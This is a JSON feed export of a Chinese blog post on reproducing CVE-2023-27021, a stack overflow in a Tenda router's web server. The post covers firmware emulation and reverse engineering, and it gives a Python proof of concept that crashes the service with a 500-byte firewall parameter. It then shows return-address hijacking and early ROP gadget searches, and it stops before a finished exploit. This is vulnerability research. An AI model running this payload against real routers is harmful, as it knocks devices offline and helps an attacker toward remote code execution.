{
    "version": "https://jsonfeed.org/version/1",
    "title": "null • All posts by \"cve-复现系列\" tag",
    "description": "欢迎来到Huan的笔记空间~~~~~~🌸",
    "home_page_url": "http://example.com",
    "items": [
        {
            "id": "http://example.com/2024/05/10/CVE-2023-27021/",
            "url": "http://example.com/2024/05/10/CVE-2023-27021/",
            "title": "CVE-2023-27021",
            "date_published": "2024-05-10T08:11:47.000Z",
            "content_html": "<p>CVE-2023-27021-tenda 路由器 - 栈溢出漏洞</p>\n<blockquote>\n<p>官网下载链接为：<span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cudGVuZGEuY29tLmNuL2Rvd25sb2FkL2RldGFpbC0yNjgwLmh0bWw=\">https://www.tenda.com.cn/download/detail-2680.html</span></p>\n</blockquote>\n<h3 id=\"去官网下载相应的产品\"><a class=\"markdownIt-Anchor\" href=\"#去官网下载相应的产品\">#</a> 去官网下载相应的产品</h3>\n<p><img data-src=\"/img/CVE-2023-27021/image-20240508183219864.png\" alt=\"image-20240508183219864\"></p>\n<p>下载之后，使用 binwalk 进行解包。</p>\n<h3 id=\"解包\"><a class=\"markdownIt-Anchor\" href=\"#解包\">#</a> 解包</h3>\n<blockquote>\n<p>binwalk -Me filename.bin</p>\n</blockquote>\n<p>分解完之后的 <code>squashfs-root</code>  即为路由器的文件系统。</p>\n<blockquote>\n<p>tenda 路由器的 web 启动程序通常是 bin 目录下的 httpd 文件</p>\n</blockquote>\n<blockquote>\n<p>$ file httpd<br>\nhttpd: ELF 32-bit LSB executable, ARM, EABI5 version 1 (SYSV), dynamically linked, interpreter /lib/ld-uClibc.so.0, stripped</p>\n</blockquote>\n<p>可以看到位 arm 架构的 32 位的可执行程序</p>\n<h3 id=\"执行程序\"><a class=\"markdownIt-Anchor\" href=\"#执行程序\">#</a> 执行程序</h3>\n<blockquote>\n<p>cp $(which qemu-arm-static) ./</p>\n<p>sudo chroot ./ ./qemu-arm-static ./bin/httpd</p>\n<p><img data-src=\"/img/CVE-2023-27021/image-20240508191156518.png\" alt=\"image-20240508191156518\"></p>\n</blockquote>\n<p>发现程序一直卡在这里，拖进 IDA 搜索字符串  <code>WeLoveLinux</code></p>\n<h3 id=\"查找原因\"><a class=\"markdownIt-Anchor\" href=\"#查找原因\">#</a> 查找原因</h3>\n<p><img data-src=\"/img/CVE-2023-27021/image-20240508193738684.png\" alt=\"image-20240508193738684\"></p>\n<p><img data-src=\"/img/CVE-2023-27021/image-20240508193627887.png\" alt=\"image-20240508193627887\"></p>\n<p>通过查看，在这里会 check_network。</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">grep</span> <span class=\"token parameter variable\">-rn</span> <span class=\"token string\">\"check_network\"</span> *</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>grep: bin/netctrl: 匹配到二进制文件</pre></td></tr><tr><td data-num=\"3\"></td><td><pre>grep: bin/multiWAN: 匹配到二进制文件</pre></td></tr><tr><td data-num=\"4\"></td><td><pre>grep: bin/httpd: 匹配到二进制文件</pre></td></tr><tr><td data-num=\"5\"></td><td><pre>grep: bin/phddns: 匹配到二进制文件</pre></td></tr><tr><td data-num=\"6\"></td><td><pre>grep: bin/tendaupload: 匹配到二进制文件</pre></td></tr><tr><td data-num=\"7\"></td><td><pre>grep: bin/logserver: 匹配到二进制文件</pre></td></tr><tr><td data-num=\"8\"></td><td><pre>grep: lib/libcommon.so: 匹配到二进制文件</pre></td></tr></table></figure><p>去寻找该函数在那个库里。 <code>libcommon.so</code></p>\n<p><img data-src=\"/img/CVE-2023-27021/image-20240508194018818.png\" alt=\"image-20240508194018818\"></p>\n<p>函数主体</p>\n<p><img data-src=\"/img/CVE-2023-27021/image-20240508194346053.png\" alt=\"image-20240508194346053\"></p>\n<p>再次寻找 <code>get_eth_name</code></p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">grep</span> <span class=\"token parameter variable\">-rn</span> <span class=\"token string\">\"get_eth_name\"</span> *</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>grep: bin/netctrl: 匹配到二进制文件</pre></td></tr><tr><td data-num=\"3\"></td><td><pre>grep: bin/dnrd: 匹配到二进制文件</pre></td></tr><tr><td data-num=\"4\"></td><td><pre>grep: bin/multiWAN: 匹配到二进制文件</pre></td></tr><tr><td data-num=\"5\"></td><td><pre>grep: bin/dhcpcd: 匹配到二进制文件</pre></td></tr><tr><td data-num=\"6\"></td><td><pre>grep: bin/httpd: 匹配到二进制文件</pre></td></tr><tr><td data-num=\"7\"></td><td><pre>grep: bin/business_proc: 匹配到二进制文件</pre></td></tr><tr><td data-num=\"8\"></td><td><pre>grep: bin/cfmd: 匹配到二进制文件</pre></td></tr><tr><td data-num=\"9\"></td><td><pre>grep: bin/time_check: 匹配到二进制文件</pre></td></tr><tr><td data-num=\"10\"></td><td><pre>grep: lib/libtpi.so: 匹配到二进制文件</pre></td></tr><tr><td data-num=\"11\"></td><td><pre>grep: lib/libChipApi.so: 匹配到二进制文件</pre></td></tr><tr><td data-num=\"12\"></td><td><pre>grep: lib/libcommon.so: 匹配到二进制文件</pre></td></tr></table></figure><p><img data-src=\"/img/CVE-2023-27021/image-20240508194612599.png\" alt=\"image-20240508194612599\"></p>\n<p><img data-src=\"/img/CVE-2023-27021/image-20240508201108424.png\" alt=\"image-20240508201108424\"></p>\n<p>从这里我们就可以看到需要什么类型的虚拟网络接口了。对应前面的 <code>get_eth_name(0)</code> ===&gt; 所以我们需要 br0</p>\n<h3 id=\"建立虚拟网络接口\"><a class=\"markdownIt-Anchor\" href=\"#建立虚拟网络接口\">#</a> 建立虚拟网络接口</h3>\n<p>通过 <code>ifconfig</code>  查看本地的网卡</p>\n<p><img data-src=\"/img/CVE-2023-27021/image-20240508183856764.png\" alt=\"image-20240508183856764\"></p>\n<blockquote>\n<p>使用以下命令建立虚拟网桥并进行 UP</p>\n</blockquote>\n<pre><code>sudo brctl addbr br0 \n这个命令创建一个新的虚拟网桥（bridge），名为br0。brctl是用于管理网络网桥的命令行工具，addbr选项用于添加一个新的网桥。这里，我们添加了一个名为br0的网桥。\n\nsudo brctl addif br0 ens33\n这个命令将物理网络接口ens33添加到刚刚创建的虚拟网桥br0中。addif选项用于将网络接口添加到网桥。这样，所有通过ens33接口的网络流量都会被转发到br0网桥，从而实现多个网络接口之间的通信。\n\nsudo ifconfig br0 up\n这个命令启用（激活）虚拟网桥br0。ifconfig是一个用于配置网络接口的命令行工具。在这里，我们使用up选项来激活br0网桥，使其可以开始处理网络流量。\n\nsudo dhclient br0\n这个命令为虚拟网桥br0分配一个动态IP地址。dhclient是一个用于请求和配置动态主机配置协议（DHCP）的命令行工具。在这里，我们使用dhclient为br0网桥获取一个动态IP地址，这样它就可以与其他网络设备进行通信。\n\nsudo tunctl -t br0 -u 'whoami'\n这个命令创建一个名为br0的虚拟网络接口。tunctl是一个用于管理虚拟网络设备的命令行工具，通常用于创建和管理TUN/TAP设备。在这里，我们使用-t选项来指定设备名称（br0），-u选项来指定拥有该设备的用户的用户名。'whoami'是一个shell命令，用于输出当前用户的用户名，因此这里会创建一个虚拟网络接口，其所有者为执行命令的当前用户。\n\nsudo ifconfig br0 192.168.65.1/24\n这个命令为虚拟网络接口br0分配一个静态IP地址。ifconfig是一个用于配置网络接口的命令行工具。在这里，我们使用它来为br0接口指定一个IP地址（192.168.65.1）和一个子网掩码（/24）。这意味着网络接口将使用192.168.65.1作为其IP地址，子网掩码为255.255.255.0。\n&gt; sudo ifconfig br0 down &amp;&amp; sudo brctl delbr br0 停止网络接口并删除\n&gt; sudo netstat -tulnp | grep 192.168.65.1:80 查找对应的服务\n&gt; kill -9 PID kill 命令来停止它\n&gt; sudo netplan apply ens33无ip修复\n</code></pre>\n<p><img data-src=\"/img/CVE-2023-27021/image-20240508184626432.png\" alt=\"image-20240508184626432\"></p>\n<h3 id=\"再次出现问题\"><a class=\"markdownIt-Anchor\" href=\"#再次出现问题\">#</a> 再次出现问题</h3>\n<p><img data-src=\"/img/CVE-2023-27021/image-20240508201807056.png\" alt=\"image-20240508201807056\"></p>\n<h3 id=\"查找原因-2\"><a class=\"markdownIt-Anchor\" href=\"#查找原因-2\">#</a> 查找原因</h3>\n<p><img data-src=\"/img/CVE-2023-27021/image-20240508204305586.png\" alt=\"image-20240508204305586\"></p>\n<p><img data-src=\"/img/CVE-2023-27021/image-20240508204329574.png\" alt=\"image-20240508204329574\"></p>\n<pre><code>GPT:\nsocket(1, 1, 0): 这个函数需要三个参数：\n\n第一个参数是域（domain），它指定了socket的协议族。在这个例子中，1代表AF_INET，即IPv4的因特网协议族。\n第二个参数是类型（type），它指定了socket的通信方式。在这个例子中，1代表SOCK_STREAM，表示一个面向连接的、可靠的字节流socket，通常用于TCP协议。\n第三个参数是协议（protocol），它指定了socket使用的特定协议。在这个例子中，0表示让系统选择默认协议。对于SOCK_STREAM类型的socket，通常使用TCP协议。\n</code></pre>\n<p>所以我们暂时无法依照现在的环境去修改网络状况。</p>\n<p>但是还有一种办法我们可以修改执行逻辑。</p>\n<p><img data-src=\"/img/CVE-2023-27021/image-20240508205103089.png\" alt=\"image-20240508205103089\"></p>\n<p>所以我们去修改这两块的逻辑</p>\n<p><img data-src=\"/img/CVE-2023-27021/image-20240508211506399.png\" alt=\"image-20240508211506399\"></p>\n<blockquote>\n<p>sudo chroot ./ ./qemu-arm-static ./bin/httpd</p>\n<p><img data-src=\"/img/CVE-2023-27021/image-20240508211557449.png\" alt=\"image-20240508211557449\"></p>\n</blockquote>\n<p>此时就可以正常访问了</p>\n<p>但是当我们正常访问时，发现网页是 404，此时我们让下面的 webroot_ro 的里面文件刷进去即可。</p>\n<h3 id=\"测试漏洞\"><a class=\"markdownIt-Anchor\" href=\"#测试漏洞\">#</a> 测试漏洞</h3>\n<p><img data-src=\"/img/CVE-2023-27021/image-20240508220917436.png\" alt=\"image-20240508220917436\"></p>\n<blockquote>\n<p>使用 IDA 逆向 httpd 文件，寻找可以造成栈溢出的函数。挖掘栈溢出漏洞，通常我们要从一些危险函数入手，第一类函数是 scanf，可能产生格式化字符串溢出漏洞，第二类是 strcpy、strcat、sprintf 等字符串拷贝函数。根据 tenda 的历史 CVE 漏洞，strcpy 函数产生的漏洞比较多，所以我们从 strcpy 入手举例。</p>\n</blockquote>\n<p><img data-src=\"/img/CVE-2023-27021/image-20240508221310337.png\" alt=\"image-20240508221310337\"></p>\n<p>我们通过这个去寻找防火墙的漏洞</p>\n<p><img data-src=\"/img/CVE-2023-27021/image-20240508222124288.png\" alt=\"image-20240508222124288\"></p>\n<p>src 直接去复制到 dest 里，后续也没有对 dest 的长度进行检测。</p>\n<p>还需要我们去确定这个是否可以进行传入，sub_2BA8C 是 WebGetvar (goahead 的函数，暂时还不会恢复符号表)，所以我们是可以通过这个函数进行传参的。接下来我们进行测试。</p>\n<p><img data-src=\"/img/CVE-2023-27021/image-20240509095758402.png\" alt=\"image-20240509095758402\"></p>\n<p><img data-src=\"/img/CVE-2023-27021/image-20240509095531606.png\" alt=\"image-20240509095531606\"></p>\n<p>故猜测以及目录为 goform</p>\n<p>测试 POC 如下：</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">import</span> requests</pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>url <span class=\"token operator\">=</span> <span class=\"token string\">\"http://192.168.65.1/goform/SetFirewallCfg\"</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>header <span class=\"token operator\">=</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    <span class=\"token string\">\"Content-Type\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"application/x-www-form-urlencoded; charset=UTF-8\"</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    <span class=\"token string\">\"Cookie\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"password=hdjcvb\"</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>payload <span class=\"token operator\">=</span> <span class=\"token string\">\"A\"</span> <span class=\"token operator\">*</span> <span class=\"token number\">500</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>data <span class=\"token operator\">=</span> <span class=\"token punctuation\">&#123;</span><span class=\"token string\">\"firewallEn\"</span><span class=\"token punctuation\">:</span> payload<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>response <span class=\"token operator\">=</span> requests<span class=\"token punctuation\">.</span>post<span class=\"token punctuation\">(</span>url<span class=\"token punctuation\">,</span> headers<span class=\"token operator\">=</span>header<span class=\"token punctuation\">,</span> data<span class=\"token operator\">=</span>data<span class=\"token punctuation\">,</span> timeout<span class=\"token operator\">=</span><span class=\"token number\">5</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>response<span class=\"token punctuation\">.</span>text<span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p>执行 POC 后：</p>\n<p><img data-src=\"/img/CVE-2023-27021/image-20240509100524266.png\" alt=\"image-20240509100524266\"></p>\n<p><img data-src=\"/img/CVE-2023-27021/image-20240509100543004.png\" alt=\"image-20240509100543004\"></p>\n<p><img data-src=\"/img/CVE-2023-27021/image-20240509100606754.png\" alt=\"image-20240509100606754\"></p>\n<p>所以可以得知存在拒绝服务漏洞。</p>\n<h3 id=\"利用漏洞-gdb调试\"><a class=\"markdownIt-Anchor\" href=\"#利用漏洞-gdb调试\">#</a> 利用漏洞 - gdb 调试</h3>\n<p><img data-src=\"/img/CVE-2023-27021/image-20240509075854662.png\" alt=\"image-20240509075854662\"></p>\n<p>测试漏洞的保护</p>\n<p>因为 NX 保护开启，无法向栈上写入 shellcode 去执行。可以去利用 rop，去进行获取 shell</p>\n<h4 id=\"配置gdb动态调试环境\"><a class=\"markdownIt-Anchor\" href=\"#配置gdb动态调试环境\">#</a> 配置 gdb 动态调试环境</h4>\n<blockquote>\n<p>sudo chroot ./ ./qemu-arm-static -g 9999 ./bin/httpd</p>\n</blockquote>\n<p>开启另一个终端</p>\n<blockquote>\n<p>gdb-multiarch ./bin/httpd</p>\n<p>pwndbg&gt; set architecture arm</p>\n<p>pwndbg&gt; target remote :9999</p>\n<blockquote>\n<p>sudo lsof -i :9999 查看 gdb 绑定端口的 PID</p>\n</blockquote>\n</blockquote>\n<p>这样我们就可以去调试程序了</p>\n<h4 id=\"利用poc去劫持ret\"><a class=\"markdownIt-Anchor\" href=\"#利用poc去劫持ret\">#</a> 利用 POC 去劫持 ret</h4>\n<p>进入 gdb 调试后我们先 n 上两步，然后执行 POC 两次，观测 gdb</p>\n<p><img data-src=\"/img/CVE-2023-27021/image-20240509102326859.png\" alt=\"image-20240509102326859\"></p>\n<p>发现返回地址确实被我们去劫持到一个我们人为输入的值。接下来就是测试我们如何将这个改成一个可获取 shell 的 rop</p>\n<h3 id=\"利用漏洞-获取shell\"><a class=\"markdownIt-Anchor\" href=\"#利用漏洞-获取shell\">#</a> 利用漏洞 - 获取 shell</h3>\n<ol>\n<li>获取返回地址据输入偏移量</li>\n</ol>\n<p><img data-src=\"/img/CVE-2023-27021/image-20240509103042769.png\" alt=\"image-20240509103042769\"></p>\n<ol start=\"2\">\n<li>寻找 libc 基址</li>\n</ol>\n<p>使用 vmmap 看内存信息</p>\n<p><img data-src=\"/img/CVE-2023-27021/image-20240509103454383.png\" alt=\"image-20240509103454383\"></p>\n<p>猜测箭头所指出为 libc 基址。</p>\n<ol start=\"3\">\n<li>寻找 gadget</li>\n</ol>\n<blockquote>\n<p>使用 ROPgadget，在 libc 中找一个可以控制 r0 的 gadget</p>\n</blockquote>\n<pre><code>ROPgadget --binary ./lib/libc.so.0 | grep &quot;mov r0, sp&quot;\n</code></pre>\n<p><img data-src=\"/img/CVE-2023-27021/image-20240509104401520.png\" alt=\"image-20240509104401520\"></p>\n<blockquote>\n<p>再在 libc 中找一个可以 pop 到 r3 的 gadget</p>\n</blockquote>\n<pre><code>ROPgadget --binary ./lib/libc.so.0 --only &quot;pop&quot;|grep r3\n</code></pre>\n<p><img data-src=\"/img/CVE-2023-27021/image-20240509104744796.png\" alt=\"image-20240509104744796\"></p>\n<p>后续补充…</p>\n",
            "tags": [
                "CVE-复现系列"
            ]
        }
    ]
}